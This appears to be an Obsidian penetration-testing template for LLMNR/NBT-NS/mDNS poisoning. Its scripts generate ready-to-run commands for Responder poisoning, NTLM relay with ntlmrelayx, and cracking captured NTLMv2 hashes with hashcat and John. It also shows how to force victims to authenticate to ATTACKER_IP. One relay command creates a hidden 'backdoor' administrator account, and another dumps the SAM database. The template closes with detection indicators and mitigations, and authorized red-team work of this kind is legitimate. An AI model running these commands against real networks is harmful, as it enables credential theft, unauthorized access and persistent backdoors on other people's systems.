---
# Attack-specific fields
responder_interface: eth0
responder_mode: analyze
captured_hash_user:
captured_ntlmv2_hash:
relay_target_ip:
wordlist: /usr/share/wordlists/rockyou.txt
cracked_password:
notes:
---

# LLMNR / NBT-NS / mDNS Poisoning

> [!abstract] Attack Summary
> When a Windows host cannot resolve a name via DNS, it falls back to **LLMNR** (Link-Local Multicast Name Resolution) and **NBT-NS** (NetBIOS Name Service) broadcasts on the local network. An attacker can respond to these broadcasts, pretending to be the requested host, and capture the NTLM authentication attempt — yielding **NTLMv2 hashes** that can be cracked or relayed.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["LHOST",    b?.lhost    ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const modes = ["analyze","poison","capture"];
const modeOptions = modes.map(m => `option(${m})`).join(',');

dv.table(["Field", "Value"], [
  ["Network Interface",   `\`INPUT[text(defaultValue("${p.responder_interface ?? 'eth0'}")):responder_interface]\``],
  ["Responder Mode",      `\`INPUT[inlineSelect(defaultValue(${p.responder_mode ?? 'analyze'}),${modeOptions}):responder_mode]\``],
  ["Relay Target IP",     `\`INPUT[text(defaultValue("${p.relay_target_ip || b?.target_ip || ''}")):relay_target_ip]\``],
  ["Wordlist",            `\`INPUT[text(defaultValue("${p.wordlist ?? '/usr/share/wordlists/rockyou.txt'}")):wordlist]\``],
]);
```

> [!danger] Always start in **Analyze** mode first to observe traffic without poisoning. Only poison during authorized testing windows.

---

## Step 1 — Analyze Mode (Observe First)

**Linux — Responder Analyze**
```dataviewjs
const p = dv.current();
const iface = p?.responder_interface || "eth0";
dv.paragraph("```bash\n# Analyze mode — passively listen, do NOT respond/poison\npython3 Responder.py -I " + iface + " -A\n\n# Or with verbose output\npython3 Responder.py -I " + iface + " -A -v\n\n# Watch for:\n# [LLMNR] Poisoned answer sent for: HOSTNAME\n# [NBT-NS] Poisoned answer sent for: HOSTNAME\n# [*] NTLMv2-SSP hash captured\n```");
```

---

## Step 2 — Identify Relay Targets (Before Poisoning)

**Linux — Find hosts without SMB signing**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const dc_ip = b?.dc_ip ?? "DC_IP";
dv.paragraph("```bash\n# Scan subnet for SMB signing status\nnxc smb " + dc_ip + "/24 --gen-relay-list relay_targets.txt\ncat relay_targets.txt\n\n# Or with nmap\nnmap -p 445 --script smb2-security-mode " + dc_ip + "/24\n```");
```

Relay target (no signing): `INPUT[text:relay_target_ip]`

---

## Step 3a — Hash Capture Mode (Responder)

> [!info] Capture NTLMv2 hashes for offline cracking. Run Responder in poison mode.

**Linux — Responder full poison**
```dataviewjs
const p = dv.current();
const iface = p?.responder_interface || "eth0";
dv.paragraph("```bash\n# Full poisoning — captures NTLM hashes from all protocols\npython3 Responder.py -I " + iface + " -wdPv\n\n# Flags:\n# -w  = WPAD server\n# -d  = DHCP poisoning (more aggressive)\n# -P  = Force NTLM auth for proxy\n# -v  = verbose\n\n# Captured hashes are saved to:\nls /usr/share/responder/logs/\n\n# Hash format: NTLMv2-SSP (hashcat mode 5600)\ncat /usr/share/responder/logs/*.txt | grep NTLMv2\n```");
```

---

## Step 3b — Relay Mode (ntlmrelayx + Responder)

> [!info] Relay captured auth to a target instead of cracking. Requires disabling Responder's SMB/HTTP servers to avoid conflict.

**Linux — Combined Responder + ntlmrelayx**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const iface  = p?.responder_interface || "eth0";
const target = p?.relay_target_ip || "TARGET_IP";
dv.paragraph("```bash\n# Terminal 1: Responder with SMB/HTTP disabled (ntlmrelayx handles those)\n# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off\npython3 Responder.py -I " + iface + " -wdPv\n\n# Terminal 2: ntlmrelayx targeting SMB\nimpacket-ntlmrelayx -t smb://" + target + " -smb2support\n\n# With shell execution\nimpacket-ntlmrelayx -t smb://" + target + " -smb2support -c 'net user backdoor P@ss123 /add && net localgroup administrators backdoor /add'\n\n# With SAM dump\nimpacket-ntlmrelayx -t smb://" + target + " -smb2support -dump\n\n# Against list of targets\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support\n```");
```

---

## Step 4 — Crack Captured NTLMv2 Hashes

```dataviewjs
const p = dv.current();
const wordlist = p?.wordlist || "/usr/share/wordlists/rockyou.txt";
dv.paragraph("```bash\n# Captured hashes are in /usr/share/responder/logs/\ncat /usr/share/responder/logs/NTLMv2-SSP-*.txt\n\n# Crack with hashcat (mode 5600 = NTLMv2)\nhashcat -a 0 -m 5600 NTLMv2_hashes.txt " + wordlist + "\n\n# With rules\nhashcat -a 0 -m 5600 NTLMv2_hashes.txt " + wordlist + " -r /usr/share/hashcat/rules/best64.rule\n\n# John\njohn --format=netntlmv2 --wordlist=" + wordlist + " NTLMv2_hashes.txt\n```");
```

Captured user: `INPUT[text:captured_hash_user]`
NTLMv2 hash: `INPUT[text:captured_ntlmv2_hash]`
Cracked password: `INPUT[text:cracked_password]`

---

## Step 5 — Trigger LLMNR Responses (Speed Up Capture)

> [!tip] Instead of waiting passively, trigger LLMNR lookups by accessing UNC paths that don't resolve.

**Windows — Force LLMNR from victim**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const lhost = b?.lhost ?? "ATTACKER_IP";
dv.paragraph("```bash\n# If you have code exec on a host, force it to authenticate to you:\nshell dir \\\\\\" + lhost + "\\share\n\n# Or via Shortcut/LNK file with UNC path targeting your IP\n# (place in a share the victim browses)\n\n# PowerShell\nshell powershell -c 'net use \\\\\\" + lhost + "\\share'\n```");
```

---

## mDNS / WPAD Attacks

```dataviewjs
const p = dv.current();
const iface = p?.responder_interface || "eth0";
dv.paragraph("```bash\n# WPAD poisoning — automatically proxy all HTTP traffic\n# Responder already handles WPAD by default with -w flag\npython3 Responder.py -I " + iface + " -wF\n\n# mDNS poisoning (Apple/Linux device targeting)\npython3 Responder.py -I " + iface + " -m\n\n# DHCP poisoning (persistent, survives across reboots)\npython3 Responder.py -I " + iface + " -d\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - **Event 4625** (failed logon) on the attacker machine from victim hosts.
> - LLMNR/NBT-NS packets visible in packet captures — unusual multicast traffic.
> - Multiple NTLMv2 authentication attempts to a non-AD host.
> - Microsoft Defender for Identity / ATA detects Responder-like behavior.
> - **Mitigation:** Disable LLMNR (GPO: Computer Configuration → Admin Templates → Network → DNS Client → Turn off multicast name resolution) and NetBIOS over TCP/IP.

---

## Notes & Results

`INPUT[textarea:notes]`
